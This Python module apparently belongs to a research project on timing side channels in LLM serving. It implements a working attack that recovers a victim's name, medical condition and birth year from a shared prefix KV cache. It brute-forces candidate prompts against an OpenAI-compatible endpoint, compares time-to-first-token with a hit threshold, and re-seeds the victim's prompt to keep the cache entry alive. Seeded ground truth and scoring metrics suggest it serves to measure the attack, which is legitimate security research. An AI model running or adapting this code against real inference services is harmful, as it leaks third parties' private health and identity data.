
import random
from dataclasses import dataclass, field

import numpy as np
from openai import OpenAI
from transformers import AutoTokenizer

from kv_attack import (
    MODEL_ID, FIRST_NAMES, LAST_NAMES, MEDICAL_CONDITIONS,
    N_REPEATS_FAST, N_REPEATS_CONFIRM, N_TOP_CANDIDATES, RESEED_EVERY,
)
from kv_attack.victim_seeder import build_private_block
from kv_attack.attacker import measure_mean_ttft, is_cache_hit


# ── Result dataclass ──────────────────────────────────────────────────────────

@dataclass
class ReconstructionResult:
    victim_id           : int
    ground_truth        : dict              # {"name": str, "dob": str, "condition": str}
    recovered           : dict              # {"name": str | None, "dob": str | None, "condition": str | None}
    token_recovery_rate : float             # fraction of RECOVERED fields correct (NOT counting given fields)
    exact_match         : bool              # ALL recovered fields correct
    total_api_calls     : int
    arpt                : float             # API calls / vocabulary tokens in recovered fields
    known_dob           : bool              # True = DOB given, not counted in TRR/ARPT
    n_private_blocks    : int               # reported from victim record
    confirmed_hit       : bool              # True = Phase B produced a confirmed hit
    scan_results        : list = field(default_factory=list)  # top-5 candidates with TTFT


# ── Helpers ───────────────────────────────────────────────────────────────────

def _field_trr(gt: dict, recovered: dict, known_dob: bool) -> float:
    """
    Token Recovery Rate at field level.

    Only fields the attacker ACTUALLY RECOVERED are counted.
    When known_dob=True, DOB was given to the attacker as prior knowledge and
    is EXCLUDED from TRR to avoid inflating the metric.

    Returns: correct_fields / evaluated_fields
    """
    evaluated = ["name", "condition"]
    if not known_dob:
        evaluated.append("dob")
    if not evaluated:
        return 0.0
    correct = sum(1 for k in evaluated if gt.get(k) == recovered.get(k))
    return correct / len(evaluated)


def _count_vocab_tokens(tokenizer: AutoTokenizer, recovered: dict,
                         known_dob: bool) -> int:
    """
    Count vocabulary tokens in the fields the attacker recovered.
    Used as the ARPT denominator (Papers 1–5 definition).
    Excludes DOB when known_dob=True.
    """
    fields = ["name", "condition"]
    if not known_dob:
        fields.append("dob")
    total = 0
    for k in fields:
        val = recovered.get(k)
        if val:
            total += len(tokenizer.encode(val, add_special_tokens=False))
    return max(total, 1)   # avoid division by zero


def _build_candidate_list(seed: int = 0) -> list[tuple[str, str]]:
    """
    Build and shuffle the full candidate list for one victim.
    Returns list of (name, condition) tuples.
    Shuffled so search order is randomised — prevents systematic bias in
    average-case ARPT measurement (earlier hits are not always easier names).
    """
    candidates = [
        (f"{first} {last}", condition)
        for first in FIRST_NAMES
        for last  in LAST_NAMES
        for condition in MEDICAL_CONDITIONS
    ]
    rng = random.Random(seed)
    rng.shuffle(candidates)
    return candidates


# ── Main reconstruction function ──────────────────────────────────────────────

def reconstruct_victim(
    client       : OpenAI,
    tokenizer    : AutoTokenizer,
    system_prefix: str,
    threshold_ms : float,
    victim_record: dict,
    known_dob    : bool = True,
    candidate_seed: int = 0,
) -> ReconstructionResult:
    """
    Attempt to recover one victim's private fields using timing signals.

    Parameters
    ----------
    victim_record : dict
        Must contain "victim_id", "prompt" (full victim prompt for re-seeding),
        "ground_truth" ({"name", "dob", "condition"}), "n_private_blocks".
    known_dob : bool
        If True, DOB is taken from ground truth (Week 10 demo mode).
        DOB is excluded from TRR and ARPT calculations.
        If False, year is recovered via linear year scan (Phase 2).
    candidate_seed : int
        Random seed for shuffling the candidate list. Use victim_id for
        victim-specific shuffles.
    """
    gt            = victim_record["ground_truth"]
    victim_id     = victim_record["victim_id"]
    reseed_prompt = victim_record["prompt"]      # used to re-seed victim blocks
    n_priv_blocks = victim_record.get("n_private_blocks", -1)
    dob_to_use    = gt["dob"] if known_dob else None

    api_calls  = 0
    scan_log: list[dict] = []   # all (candidate, mean_ttft) for the scan

    # ── Phase A: fast scan ────────────────────────────────────────────────────
    candidates = _build_candidate_list(seed=candidate_seed)
    print(f"[reconstructor] Victim {victim_id}: "
          f"scanning {len(candidates)} candidates (N_FAST={N_REPEATS_FAST}) ...")

    for probe_idx, (cand_name, cand_condition) in enumerate(candidates):

        # ── Self-eviction prevention ──────────────────────────────────────────
        if probe_idx > 0 and probe_idx % RESEED_EVERY == 0:
            try:
                client.completions.create(
                    model=MODEL_ID, prompt=reseed_prompt,
                    max_tokens=1, temperature=0.0,
                )
                api_calls += 1
            except Exception as exc:
                print(f"[reconstructor] WARNING: re-seed failed at probe "
                      f"{probe_idx}: {exc}")

        # ── Build probe ───────────────────────────────────────────────────────
        dob   = dob_to_use if dob_to_use else gt["dob"]   # fallback for demo
        probe = system_prefix + " " + build_private_block(
            cand_name, dob, cand_condition
        )

        mean_ttft = measure_mean_ttft(client, probe, n=N_REPEATS_FAST)
        api_calls += N_REPEATS_FAST

        scan_log.append({
            "name"     : cand_name,
            "condition": cand_condition,
            "mean_ttft": round(mean_ttft, 3),
        })

        # Early exit: delta=487ms means hit (88ms) and miss (576ms) never overlap.
        # First candidate below threshold is definitively the hit — stop scanning.
        if mean_ttft < threshold_ms:
            print(f"[reconstructor] Early exit at probe {probe_idx + 1}: "
                  f"TTFT={mean_ttft:.1f} ms < threshold={threshold_ms:.1f} ms")
            break

    # Sort all results by TTFT ascending (lowest TTFT = most likely hit)
    scan_log.sort(key=lambda x: x["mean_ttft"])
    top_candidates = scan_log[:N_TOP_CANDIDATES]

    print(f"[reconstructor] Victim {victim_id}: "
          f"top-5 TTFT after scan: "
          f"{[round(c['mean_ttft'], 1) for c in top_candidates]} ms")

    # ── Phase B: confirmation ─────────────────────────────────────────────────
    confirmed_name      = None
    confirmed_condition = None
    confirmed_hit       = False

    for candidate in top_candidates:
        cand_name      = candidate["name"]
        cand_condition = candidate["condition"]
        dob            = dob_to_use if dob_to_use else gt["dob"]

        probe = system_prefix + " " + build_private_block(
            cand_name, dob, cand_condition
        )

        hit, mean_ttft = is_cache_hit(
            client, probe, threshold_ms, n=N_REPEATS_CONFIRM
        )
        api_calls += N_REPEATS_CONFIRM

        if hit:
            confirmed_name      = cand_name
            confirmed_condition = cand_condition
            confirmed_hit       = True
            print(f"[reconstructor] Victim {victim_id}: "
                  f"CONFIRMED HIT — name='{cand_name}' "
                  f"condition='{cand_condition}' "
                  f"ttft={mean_ttft:.1f} ms  "
                  f"after {api_calls} total API calls")
            break

    # If no confirmed hit, take the fast-scan winner as best guess
    if not confirmed_hit:
        confirmed_name      = scan_log[0]["name"]
        confirmed_condition = scan_log[0]["condition"]
        print(f"[reconstructor] Victim {victim_id}: "
              f"no confirmed hit — using fast-scan winner: "
              f"name='{confirmed_name}' condition='{confirmed_condition}'")

    # ── DOB recovery (Phase 2 extension) ─────────────────────────────────────
    recovered_dob = dob_to_use
    dob_api_calls = 0
    if not known_dob and confirmed_name and confirmed_condition:
        recovered_dob, dob_api_calls = _recover_dob_year_linear(
            client, system_prefix, threshold_ms,
            confirmed_name, confirmed_condition,
        )
        api_calls += dob_api_calls

    # ── Compile result ────────────────────────────────────────────────────────
    recovered = {
        "name"     : confirmed_name,
        "condition": confirmed_condition,
        "dob"      : recovered_dob,
    }

    trr         = _field_trr(gt, recovered, known_dob)
    exact_match = all(recovered.get(k) == gt.get(k)
                      for k in ("name", "condition") + (() if known_dob else ("dob",)))
    vocab_tokens = _count_vocab_tokens(tokenizer, recovered, known_dob)
    arpt         = round(api_calls / vocab_tokens, 2)

    return ReconstructionResult(
        victim_id           = victim_id,
        ground_truth        = gt,
        recovered           = recovered,
        token_recovery_rate = trr,
        exact_match         = exact_match,
        total_api_calls     = api_calls,
        arpt                = arpt,
        known_dob           = known_dob,
        n_private_blocks    = n_priv_blocks,
        confirmed_hit       = confirmed_hit,
        scan_results        = top_candidates,
    )


# ── DOB year recovery (Phase 2 extension) ────────────────────────────────────

def _recover_dob_year_linear(
    client       : OpenAI,
    system_prefix: str,
    threshold_ms : float,
    name         : str,
    condition    : str,
    year_range   : tuple[int, int] = (1935, 2006),
) -> tuple[str | None, int]:
    """
    Recover the victim's birth year by exhaustive linear scan over year_range.
    Uses January 1 as placeholder month/day during the year search.
    Month and day recovery are left for Phase 2 (43 more probes each).

    NOTE: Named "linear scan" not "binary search". Binary search over years
    is IMPOSSIBLE because a cache miss gives no directional information —
    the miss TTFT is the same whether the true year is higher or lower.

    Returns (recovered_year_date_str, api_calls_used).
    recovered_year_date_str is in the form "YYYY-01-01" (year only recovered).
    """
    api_calls  = 0
    for year in range(year_range[0], year_range[1] + 1):
        dob_candidate = f"{year}-01-01"
        probe = system_prefix + " " + build_private_block(
            name, dob_candidate, condition
        )
        hit, _ = is_cache_hit(client, probe, threshold_ms, n=N_REPEATS_FAST)
        api_calls += N_REPEATS_FAST
        if hit:
            return dob_candidate, api_calls

    return None, api_calls
